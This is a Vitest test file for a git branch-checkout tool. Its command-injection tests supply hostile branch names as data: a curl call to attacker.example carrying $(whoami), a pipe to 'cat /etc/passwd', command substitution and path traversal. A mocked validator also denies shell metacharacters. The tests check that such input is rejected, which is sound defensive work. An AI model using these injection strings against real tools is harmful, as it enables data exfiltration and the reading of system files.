import { describe, it, expect, vi, beforeEach } from 'vitest';

vi.mock('../src/shared/gitUtils.js', () => ({
  isGitRepository: vi.fn(),
  hasUncommittedChanges: vi.fn(),
  getCurrentBranch: vi.fn(),
  validateGitBranchName: vi.fn((branchName: string) => {
    // Default mock: pass-through for valid branch names, throw for invalid
    const trimmed = branchName.trim();
    if (!trimmed) {
      throw new Error("Branch name cannot be empty");
    }
    if (trimmed.includes("..")) {
      throw new Error("Branch name must not contain '..'");
    }
    // Simplified check for common injection patterns
    if (trimmed.includes(";") || trimmed.includes("|") || trimmed.includes("$") || trimmed.includes("`")) {
      throw new Error("Branch name may only contain letters, numbers, slashes, underscores, periods, and hyphens");
    }
    return trimmed;
  })
}));

import { isGitRepository, hasUncommittedChanges, getCurrentBranch, validateGitBranchName } from '../src/shared/gitUtils.js';
import { checkoutWorkitemBranch } from '../src/checkoutWorkitemBranch.js';

describe('checkoutWorkitemBranch', () => {
  const REPO_URL = 'https://example.com/repo.git';
  const BRANCH = 'feature/WI-123';
  const LOCAL_PATH = '/path/to/repo';

  beforeEach(() => {
    vi.clearAllMocks();
  });

  it('returns error when repoUrl or branchName missing', async () => {
    (isGitRepository as any).mockReturnValue(true);
    (hasUncommittedChanges as any).mockReturnValue(false);

    const res1 = await checkoutWorkitemBranch({ repoUrl: '', branchName: BRANCH, localPath: LOCAL_PATH });
    expect(res1.isError).toBe(true);
    expect(res1.content[0].text).toMatch(/Missing required parameters/);

    const res2 = await checkoutWorkitemBranch({ repoUrl: REPO_URL, branchName: '', localPath: LOCAL_PATH });
    expect(res2.isError).toBe(true);
    expect(res2.content[0].text).toMatch(/Missing required parameters/);
  });

  it('returns error when localPath is missing', async () => {
    const res = await checkoutWorkitemBranch({ repoUrl: REPO_URL, branchName: BRANCH, localPath: '' });
    expect(res.isError).toBe(true);
    expect(res.content[0].text).toMatch(/'localPath' is required/);
  });

  it('returns error when localPath is not a git repo', async () => {
    (isGitRepository as any).mockReturnValue(false);

    const res = await checkoutWorkitemBranch({ repoUrl: REPO_URL, branchName: BRANCH, localPath: LOCAL_PATH });
    expect(res.isError).toBe(true);
    expect(res.content[0].text).toMatch(/is not a Git repository/);
  });

  it('returns error when uncommitted changes exist', async () => {
    (isGitRepository as any).mockReturnValue(true);
    (hasUncommittedChanges as any).mockReturnValue(true);
    (getCurrentBranch as any).mockReturnValue('feature/WI-456');

    const res = await checkoutWorkitemBranch({ repoUrl: REPO_URL, branchName: BRANCH, localPath: LOCAL_PATH });
    expect(res.isError).toBe(true);
    expect(res.content[0].text).toMatch(/has uncommitted changes/);
    expect(res.content[0].text).toMatch(/Current branch is 'feature\/WI-456'/);
    expect(res.content[0].text).toMatch(/Do not commit those pending changes to/);
  });

  it('returns action plan for fetch and checkout without cloning', async () => {
    (isGitRepository as any).mockReturnValue(true);
    (hasUncommittedChanges as any).mockReturnValue(false);

    const res = await checkoutWorkitemBranch({ repoUrl: REPO_URL, branchName: BRANCH, localPath: LOCAL_PATH });
    expect(res.isError).toBeUndefined();
    expect(res.content).toHaveLength(1);
    expect(res.content[0].type).toBe('text');
    const text = res.content[0].text as string;
    expect(text).toMatch(/Checkout work item branch/);
    expect(text).toMatch(/git fetch origin/);
    expect(text).toMatch(/git ls-remote/);
    expect(text).toMatch(/git checkout/);
    expect(text).toMatch(/git pull --ff-only/);
  });

  describe('Command Injection Prevention (W-22550539)', () => {
    beforeEach(() => {
      (isGitRepository as any).mockReturnValue(true);
      (hasUncommittedChanges as any).mockReturnValue(false);
    });

    it('should reject branch names with command injection attempts (semicolon)', async () => {
      const maliciousBranch = 'feature/x; curl https://attacker.example/$(whoami)';

      const res = await checkoutWorkitemBranch({
        repoUrl: REPO_URL,
        branchName: maliciousBranch,
        localPath: LOCAL_PATH
      });

      expect(res.isError).toBe(true);
      expect(res.content[0].text).toMatch(/Invalid branch name/);
    });

    it('should reject branch names with command injection attempts (pipe)', async () => {
      const maliciousBranch = 'feature/x | cat /etc/passwd';

      const res = await checkoutWorkitemBranch({
        repoUrl: REPO_URL,
        branchName: maliciousBranch,
        localPath: LOCAL_PATH
      });

      expect(res.isError).toBe(true);
      expect(res.content[0].text).toMatch(/Invalid branch name/);
    });

    it('should reject branch names with command substitution ($())', async () => {
      const maliciousBranch = 'feature/$(whoami)';

      const res = await checkoutWorkitemBranch({
        repoUrl: REPO_URL,
        branchName: maliciousBranch,
        localPath: LOCAL_PATH
      });

      expect(res.isError).toBe(true);
      expect(res.content[0].text).toMatch(/Invalid branch name/);
    });

    it('should reject branch names with command substitution (backticks)', async () => {
      const maliciousBranch = 'feature/`whoami`';

      const res = await checkoutWorkitemBranch({
        repoUrl: REPO_URL,
        branchName: maliciousBranch,
        localPath: LOCAL_PATH
      });

      expect(res.isError).toBe(true);
      expect(res.content[0].text).toMatch(/Invalid branch name/);
    });

    it('should reject branch names with path traversal (..)', async () => {
      const maliciousBranch = 'feature/../../../etc/passwd';

      const res = await checkoutWorkitemBranch({
        repoUrl: REPO_URL,
        branchName: maliciousBranch,
        localPath: LOCAL_PATH
      });

      expect(res.isError).toBe(true);
      expect(res.content[0].text).toMatch(/Invalid branch name/);
    });

    it('should accept valid branch names with slashes', async () => {
      const validBranch = 'feature/WI-12345';

      const res = await checkoutWorkitemBranch({
        repoUrl: REPO_URL,
        branchName: validBranch,
        localPath: LOCAL_PATH
      });

      expect(res.isError).toBeUndefined();
      expect(res.content[0].text).toMatch(/Checkout work item branch/);
    });

    it('should accept valid branch names with hyphens and underscores', async () => {
      const validBranch = 'feature/my-branch_name-123';

      const res = await checkoutWorkitemBranch({
        repoUrl: REPO_URL,
        branchName: validBranch,
        localPath: LOCAL_PATH
      });

      expect(res.isError).toBeUndefined();
      expect(res.content[0].text).toMatch(/Checkout work item branch/);
    });

    it('should shell-escape branch names in generated commands', async () => {
      const validBranch = 'feature/WI-12345';

      const res = await checkoutWorkitemBranch({
        repoUrl: REPO_URL,
        branchName: validBranch,
        localPath: LOCAL_PATH
      });

      expect(res.isError).toBeUndefined();
      const text = res.content[0].text as string;

      // Branch name should be shell-escaped with single quotes in commands
      expect(text).toMatch(/git fetch origin '[^']+'/);
      expect(text).toMatch(/git ls-remote .* origin '[^']+'/);
      expect(text).toMatch(/git checkout '[^']+'/);
      expect(text).toMatch(/git checkout -t origin\/('[^']+'|'[^']+\/[^']+')/);
    });

    it('should prevent the exact POC from W-22550539', async () => {
      const pocBranch = 'feature/x; curl https://attacker.example/$(whoami)';

      const res = await checkoutWorkitemBranch({
        repoUrl: REPO_URL,
        branchName: pocBranch,
        localPath: LOCAL_PATH
      });

      expect(res.isError).toBe(true);
      expect(res.content[0].text).toMatch(/Invalid branch name/);
      // Ensure the malicious command is not present in the output
      expect(res.content[0].text).not.toMatch(/curl https:\/\/attacker\.example/);
    });
  });
});
